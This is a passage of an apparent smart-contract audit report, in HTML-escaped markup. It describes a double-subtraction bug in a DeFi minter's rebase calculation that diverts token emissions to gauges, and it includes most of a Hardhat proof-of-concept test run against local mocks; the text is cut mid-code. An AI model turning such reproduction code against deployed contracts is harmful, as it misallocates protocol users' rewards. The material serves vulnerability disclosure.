supply including smNFT bonus effects.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA Hardhat test (\u003ccode\u003etest/poc-rebase-miscalculation.js\u003c/code\u003e), utilizing necessary mock contracts, has been developed to demonstrate the vulnerability.\u003c/p\u003e\n\u003cp\u003eThe PoC executes the following key steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eDeploys core contracts (\u003ccode\u003eBlack\u003c/code\u003e, \u003ccode\u003eVotingEscrow\u003c/code\u003e, \u003ccode\u003eMinterUpgradeable\u003c/code\u003e) and required mocks.\u003c/li\u003e\n\u003cli\u003eCreates both a standard veNFT lock and a Supermassive NFT (smNFT), triggering the \u003ccode\u003eBLACK\u003c/code\u003e token burn for the smNFT.\u003c/li\u003e\n\u003cli\u003eAdvances time to enable a new minting period via \u003ccode\u003eMinterUpgradeable.update_period()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCompares rebase calculations:\u003c/strong\u003e It invokes \u003ccode\u003eMinterUpgradeable.calculate_rebase()\u003c/code\u003e and compares this value to a manually corrected calculation that rectifies the double-subtraction of \u003ccode\u003e_smNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVerifies emission misallocation:\u003c/strong\u003e It calls \u003ccode\u003eMinterUpgradeable.update_period()\u003c/code\u003e to perform the actual minting and distribution. It then asserts that:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eBLACK\u003c/code\u003e tokens transferred to the (mocked) \u003ccode\u003eRewardsDistributor\u003c/code\u003e match the contract’s flawed, lower rebase calculation.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eBLACK\u003c/code\u003e tokens approved for the (mocked) \u003ccode\u003eGaugeManager\u003c/code\u003e are consequently higher than they would be with a correct rebase, and this excess precisely matches the amount miscalculated from the rebase.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eKey findings demonstrated by the PoC:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe contract’s \u003ccode\u003ecalculate_rebase()\u003c/code\u003e function yields a significantly lower rebase amount than the correctly calculated value when \u003ccode\u003e_smNFTBalance \u003e 0\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis understated rebase amount is what is actually distributed.\u003c/li\u003e\n\u003cli\u003eThe difference (the “misallocated amount”) is verifiably diverted towards gauge emissions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe full PoC script and mock contracts will be provided below. The test passes and includes detailed console logs to trace the state and calculations.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003epoc_rebase_miscalculation.js\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { expect } = require(\u0026quot;chai\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econst { ethers, network } = require(\u0026quot;hardhat\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003edescribe(\u0026quot;MinterUpgradeable - Rebase Miscalculation PoC\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let deployer, user1, team; // Signers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let blackToken, votingEscrow, minter, gaugeManagerMock, rewardsDistributorMock, blackGovernorMock;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    let votingBalanceLogic, votingDelegationLib; // Libraries\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const WEEK = 1800; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const PRECISION = ethers.BigNumber.from(\u0026quot;10000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const TOKEN_DECIMALS = 18; // For formatting ethers\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    async function setupContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        [deployer, user1, team] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackFactory = await ethers.getContractFactory(\u0026quot;Black\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackToken = await BlackFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!(await blackToken.initialMinted())) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await blackToken.connect(deployer).initialMint(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const initialUserTokens = ethers.utils.parseEther(\u0026quot;1000000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(user1.address, initialUserTokens);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingBalanceLogicFactory = await ethers.getContractFactory(\u0026quot;VotingBalanceLogic\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingBalanceLogic = await VotingBalanceLogicFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingBalanceLogic.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingDelegationLibFactory = await ethers.getContractFactory(\u0026quot;VotingDelegationLib\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingDelegationLib = await VotingDelegationLibFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingDelegationLib.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingEscrowFactory = await ethers.getContractFactory(\u0026quot;VotingEscrow\u0026quot;, {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VotingBalanceLogic: votingBalanceLogic.address },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, ethers.constants.AddressZero, ethers.constants.AddressZero);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if ((await votingEscrow.team()) !== team.address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await votingEscrow.connect(deployer).setTeam(team.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeManagerMockFactory = await ethers.getContractFactory(\u0026quot;GaugeManagerMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeManagerMock = await GaugeManagerMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManagerMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const RewardsDistributorMockFactory = await ethers.getContractFactory(\u0026quot;RewardsDistributorMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        rewardsDistributorMock = await RewardsDistributorMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributorMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackGovernorMockFactory = await ethers.getContractFactory(\u0026quot;BlackGovernorMock\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernorMock = await BlackGovernorMockFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernorMock.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManagerMock.setBlackGovernor(blackGovernorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterFactory = await ethers.getContractFactory(\u0026quot;MinterUpgradeable\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        minter = await MinterFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer).initialize(gaugeManagerMock.address, votingEscrow.address, rewardsDistributorMock.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if ((await minter.team()) !== team.address) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minter.connect(deployer).setTeam(team.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            await minter.connect(team).acceptTeam();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minter.connect(deployer)._initialize([], [], 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).setMinter(minter.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(user1).approve(votingEscrow.address, ethers.constants.MaxUint256);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    async function advanceToNextMintingPeriod(minterContract) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentActivePeriod = await minterContract.active_period();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let currentTime = ethers.BigNumber.from((await ethers.provider.getBlock(\u0026#39;latest\u0026#39;)).timestamp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let targetTimeForUpdate = currentActivePeriod.add(WEEK);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (currentTime.lt(targetTimeForUpdate)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const timeToAdvance = targetTimeForUpdate.sub(currentTime).toNumber();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (timeToAdvance \u0026gt; 0) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                await network.provider.send(\u0026quot;evm_increaseTime\u0026quot;, [timeToAdvance]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await network.provider.send(\u0026quot;evm_mine\u0026quot;); // Mine a block regardless to update timestamp\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Helper function to format BigNumbers consistently for logging\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function formatBN(bn) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return ethers.utils.formatUnits(bn, TOKEN_DECIMALS);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    it(\u0026quot;should have correct rebase when smNFTBalance is zero\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await setupContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockAmount = ethers.utils.parseEther(\u0026quot;10000\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = WEEK * 52;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceToNextMintingPeriod(minter);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const veTotal = await blackToken.balanceOf(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const blackTotal = await blackToken.totalSupply();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTBalance = await votingEscrow.smNFTBalance();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const superMassiveBonus = await votingEscrow.calculate_sm_nft_bonus(smNFTBalance);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const weeklyEmission = await minter.weekly();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;\\n--- Test Case: smNFTBalance is ZERO ---\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  veTotal:\u0026quot;, formatBN(veTotal));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  blackTotal:\u0026quot;, formatBN(blackTotal));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smNFTBalance:\u0026quot;, formatBN(smNFTBalance)); // Should be 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  superMassiveBonus:\u0026quot;, formatBN(superMassiveBonus)); // Should be 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Weekly Mint:\u0026quot;, formatBN(weeklyEmission));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const rebaseContract = await minter.calculate_rebase(weeklyEmission);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Rebase (Contract):\u0026quot;, formatBN(rebaseContract));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected calculation (should match contract when smNFTBalance is 0)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Contract\u0026#39;s circulatingBlack = blackTotal - veTotal - smNFTBalance\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Corrected circulatingBlack = blackTotal - veTotal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Since smNFTBalance is 0, these are the same.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const correctedCirculating = blackTotal.sub(veTotal);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const correctedDenominator = blackTotal.add(superMassiveBonus); // bonus is 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        let correctedRebase = ethers.BigNumber.from(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        if (!correctedDenominator.isZero() \u0026amp;\u0026amp; correctedCirculating.gte(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const numSq = correctedCirculating.mul(correctedCirculating);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            const denSqTimes2 = correctedDenominator.mul(correctedDenominator).mul(2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if(!denSqTimes2.isZero()) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                correctedRebase = weeklyEmission.mul(numSq).div(denSqTimes2);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Rebase (Corrected):\u0026quot;, formatBN(correctedRebase));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(smNFTBalance).to.equal(0, \u0026quot;smNFTBalance should be zero for this test case\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const diff = rebaseContract.sub(correctedRebase).abs();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Allow for extremely small dust if any fixed point math slightly differs, though should be equal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const tolerance = ethers.utils.parseUnits(\u0026quot;1\u0026quot;, \u0026quot;wei\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        expect(diff).to.be.lte(tolerance, \u0026quot;Rebase calculations should be identical when smNFTBalance is zero\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;should demonstrate rebase miscalculation when smNFTBalance is positive\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await setupContracts(); // Ensure fresh state for this test\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockAmount = ethers.utils.parseEther(\u0026quot;10000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTLockAmount = ethers.utils.parseEther(\u0026quot;50000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = WEEK * 52 * 1; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(lockAmount, lockDuration, false /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(user1).create_lock(smNFTLockAmount, lockDuration, true /* isSMNFT */);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await advanceToNextMintingPeriod(minter);\u003c/span\u003e\u003c/span\u003e\n\u003cspan 